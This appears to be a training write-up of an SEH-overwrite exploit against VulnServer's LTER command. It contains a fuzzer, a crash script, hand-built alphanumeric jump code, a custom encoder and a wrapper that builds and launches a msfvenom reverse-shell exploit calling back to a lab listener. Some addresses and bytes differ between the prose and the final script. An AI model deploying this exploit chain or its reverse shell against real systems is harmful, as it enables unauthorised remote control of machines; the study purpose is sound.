# VulnServer LTER Notes

We begin this exercise by loading VulnServer.exe onto our Windows XP machine.
This program listens for connections on port TCP/9999 and responds to commands
like "STATS", "KSTET", and "SRUN".  We will be testing the "LTER" command.  

## Fuzz
We first build a quick Python script to fuzz the application.  It looks like
this: 
```
#!/usr/bin/env python

from boofuzz import *

def main():
    c = SocketConnection("192.168.186.135", 9999, proto='tcp')
    t = Target(connection = c)
    s = Session(target=t)

    s_initialize(name="Request")

    with s_block("UA-Line"):
        s_string("LTER", fuzzable=False)
        s_delim(" ", fuzzable=False, name='space-4')
        s_string("test", name='lter-value')
        s_static("\r\n", "Request-CRLF")

    s.connect(s_get("Request"))

    s.fuzz()

if __name__ == "__main__":
    main()
```

We notice almost immediately that it crashes on the following input:
```
LTER /.:/$(python -c "print('A' * 4000)")..
```

Interestingly, the '../', or at least a '.', at the end of the string appears 
to be required to trigger the crash.  Digging deeper, we discover that a '.'
followed by a line feed is all that is required to crash
the server:
```
#!/usr/bin/env python

import socket

message  = "LTER "
message += 'A' * 4000
message += ".\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.186.135", 9999))

s.send(message)
```

## Crash
It appears that the SEH handler at address `0x00b8ffdc` is being overwritten
during the crash.  Using Metasploit's `pattern_offset.rb` script, we find that 
the SEH overwrite takes place at offset 3503, address `0x00b8ffe0`.  

Using Olly's SafeSEH plugin, we discover a POP/POP/RET sequence in module
`essfunc` at address `0x625010b4`:
```
5B  POP EBX
5D  POP EBP
C3  RETN
```

Unfortunately, it appears that the `B4` in our address is rewritten to `35`.  We
use the `badchars.py` script to identify that characters `0x81` - `0xff` are bad
and will be stripped from our input.  With this knowledge in hand, we identify
another POP/POP/RET that uses only valid characters at address `0x625012ab`.

## Jump
Now that we control the flow of execution, let's see if we can find our way to a
less restrictive area.  We have two regions to work with: a block at the
beginnning of the buffer of length 3,499, and a short section at the end of 28
bytes.  

Since our character set is limited to <=`0x80`, we are limited to jumping
forward into our small block of 28 bytes.  We observe that `ESP` is
`0x00b7ee50`, which isn't too far from where we'd like to end up, so let's see
if we can use the next few instructions to land us at the beginning of our
larger buffer.

We use a pair of complementary two-byte jump instructions to ensure we land just
past the SEH address:
```
77 08   JA SHORT 00B8FFE6
76 06   JBE SHORT 00B8FFE6
```

Ultimately, we'd like to make a `JMP EAX` call, which has opcode `0xFFE0`.  We
will accomplish this by moving our stack pointer to the end of our 28-byte
buffer, carving out a `JMP EAX` instruction in one of our registers, and pushing
it onto the stack at the end of our buffer.  

We begin by loading `ECX` into `EAX` since the instructions that target `EAX` 
are more conducive to our character set restrictions:
```
51          PUSH ECX
58          POP EAX
```

To set the stack pointer to `0x00B90000`, we use `BX` to clear out `AX`, then
decrement `AX` (`0x0000` -> `0xFFFF`) and increment `EAX` 
(`0x00B8FFFF` -> `0x00B90000`):
```
66:53       PUSH Bx
66:58       POP AX
66:48       DEC AX
40          INC EAX
50          PUSH EAX
5C          POP ESP
```

Next, we set `AX` back to `0xFFFF` and carve out a `JMP EAX` call, pushing it
onto the stack right at the end of our buffer, at address `0x00B8FFFE-F`:
```
66:2D 011F  SUB AX,1F01
40          INC EAX
66:50       PUSH AX
```

Finally, we XOR out the address to which we'd like to jump, near the beginning
of our 3500-byte buffer at address `0x00B8F28C`.
```
66:35 7312  XOR AX,1273
```

## Reverse Shell
We begin the next stage by moving our stack to a safe location near the end of
the 3,500 byte buffer:
```
# 0x00B8FFFE -> 0x00B8FE9C
66:0D 100E  OR AX,0E10  
50          PUSH EAX
5C          POP ESP
```

Still fighting a prohibitively restrictive set of usable characters, we must
resort to using an arithmetic encoder.  This one works by breaking the desired
shellcode into 4-byte chunks, using safe characters to subtract from zero 
until we land at the desired DWORD, then pushing those instructions onto the
stack.  It consists of a few hundred blocks that look like this:
```
25 4A4D4E55      AND EAX,554E4D4A
25 3532312A      AND EAX,2A313235
2D 01010101      SUB EAX,01010101
2D 01100141      SUB EAX,41011001
2D 087C067E      SUB EAX,7E067C08
50               PUSH EAX
```

Since the shikata_ga_nai encoder we've chosen for our final payload stage 
requires a few bytes' overhead at the top of the stack, we'll conclude our 
decoding process by pushing a few 'NOP's to separate our working space from our 
decoded shellcode:
```
# Push 3x 'PUSH 0x47474747' instructions
68 47474768      PUSH 68474747
68 47476847      PUSH 47684747
68 47684747      PUSH 47476847
```

## Scripts
Here is the script I wrote to perform the encoding process:
```
#!/usr/bin/env python
import sys

allowed  = ""
allowed += "\x01\x02\x03\x04\x05\x06\x07\x08\x09" # \x0a\x0b
allowed += "\x10\x11\x12\x13\x14\x15\x16\x17" # \x0d\x0c\x0e\x0f
allowed += "\x19\x1a\x1b\x1c\x1d\x1e\x1f\x21\x22\x23" # \x18\x20
allowed += "\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
allowed += "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b"
allowed += "\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47"
allowed += "\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53"
allowed += "\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
allowed += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b"
allowed += "\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77"
allowed += "\x78\x79\x7a\x7b\x7c\x7d\x7e" # \x7f

a_int = [ord(n) for n in list(allowed)]

def findCombo(dword, three=False):
    global a_int

    matches = []
    zero = False
    carry = 0
    for x in range(0, 4):
        byte = (dword - (carry | zero)) % 256

        found = False
        l = [(f1, f2) for f1 in a_int for f2 in a_int]
        if three:
            l = [(f1, f2, f3) for f1 in a_int for f2 in a_int for f3 in a_int]

        for i in l:
            if not found and (sum(i) % 256) == byte and len(set(i) - set(a_int)) == 0:
                found = True
                carry = (sum(i) >= 0x100)
                zero = False #(byte == 0xFF)
                matches.append(i)
        dword >>= 8
    return matches

def main():
    if len(sys.argv) != 2:
        return 1

    args = ["{:02x}".format(ord(a)) for a in sys.argv[1][::-1]]
    chars = [args[i * 4:(i + 1) * 4] for i in range((len(args) + 4 - 1) // 4 )] 
    chars = ["".join(c) for c in chars]

    for group in chars:
        group += ('47' * (4 - (len(group)/2)))
        g =   int(group, 16)
        ffg = int('ffffffff', 16) - g + 1
        ffg_h = "0x{:08x}".format(ffg)

        c = findCombo(ffg)
        f = ["".join(["{:02x}".format(j) for j in list(i)]) for i in zip(*c[::-1])]
        f_sum = "0x{:08x}".format(sum([int(i, 16) for i in f]) % (2**32))
        if (ffg_h != f_sum):
            c = findCombo(ffg, True)
            f = ["".join(["{:02x}".format(j) for j in list(i)]) for i in zip(*c[::-1])]
            f_sum = "0x{:08x}".format(sum([int(i, 16) for i in f]) % (2**32))

            if(ffg_h != f_sum):
                print ("# {0} -> {1}".format(ffg_h, f_sum))
        print "\n".join(["AND EAX, 0x{0}".format(i) for i in ("554e4d4a", "2a313235")])
        print "\n".join(["SUB EAX, 0x{0}".format(j) for j in f])
        print "PUSH EAX\n"

    return 0

if __name__ == "__main__":
    sys.exit(main())
```
Even though `0xFF` isn't technically a bad character, the script has a bug that 
keeps it from properly encoding that character when it's preceded by a byte that
overflows and carries a `1` into the next position.

And, to tie everything together, a wrapper script to generate the shellcode, 
call the encoder, assemble the final payload, and execute the exploit:
```
#!/bin/bash

ROOT=$(dirname $(readlink -f ${0}))

echo "Generating payload..."
[ ! -f ${ROOT}/shell ] && msfvenom lport=4444 lhost=192.168.186.133 exitfunc=thread \
        -p windows/shell_reverse_tcp \
        -f raw \
        -e x86/shikata_ga_nai \
        -b '\x00\x01\xff' \
        -o ${ROOT}/shell 2>/dev/null

echo "Building shell-encoded.nasm..."
echo "[BITS 32]" > ${ROOT}/shell-encoded.nasm

echo "Calculating pad..."
PAD_N=$(echo "$(wc -c shell | awk '{print $1}') % 4" | bc | tr -d '\n')
PAD=$(python -c "print('\x47' * (4+${PAD_N}))" | tr -d '\n')

echo "Calling encode.py..."
./encode.py "$(echo -ne "${PAD}" && cat ${ROOT}/shell)" >> ${ROOT}/shell-encoded.nasm

echo "Assembling shell.nasm..."
nasm ${ROOT}/shell-encoded.nasm -o ${ROOT}/shell-encoded

echo "Dumping shell-encoded..."
SHELLCODE=$(/usr/local/bin/hex ${ROOT}/shell-encoded | tail -n +2 | sed -r 's/^\s+//g')

echo "Building exploit.py..."
cat << EOF > exploit.py
#!/usr/bin/env python

import sys
import socket

message  = "LTER "
message += 'A' * 100

buf  = "\x66\x0d\x10\x0e\x50\x5c"  # "or ax,0x0e10 / push eax / pop esp"

${SHELLCODE}

buf += "\x68\x47\x47\x47\x47"
buf += "\x68\x47\x47\x47\x47"
buf += "\x68\x47\x47\x47\x47"
buf += "\x68\x47\x47\x47\x47"

message += buf
message += "A" * (3499-100-len(buf))

message += "\x77\x06\x76\x04"
message += "\x0b\x12\x50\x62"

jump  = "\x51\x58"  # push ecx / pop eax
jump += "\x66\x53"  # push bx
jump += "\x66\x58"  # pop ax
jump += "\x66\x48"  # dec ax
jump += "\x40"  # inc eax
jump += "\x50\x5c"  # push eax / pop esp
jump += "\x48"  # dec eax
jump += "\x66\x2d\x01\x1f"  # sub ax,0x1f01
jump += "\x40"  # inc eax
jump += "\x66\x50"  # push ax
jump += "\x66\x35\x73\x12"  # xor ax,0x1b03

message += jump 
message += 'E' * (4000 - 3499 - 4 - 4 - len(jump))
message += ".\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.186.135", 9999))

s.send(message)
EOF

echo "Cleaning up..."
rm ${ROOT}/{shell,shell-encoded,shell-encoded.nasm}

echo "Executing exploit..."
./exploit.py
```

If we've done everything right up to this point, our shellcode will execute and
we'll receive a reverse shell connection on port 4444.
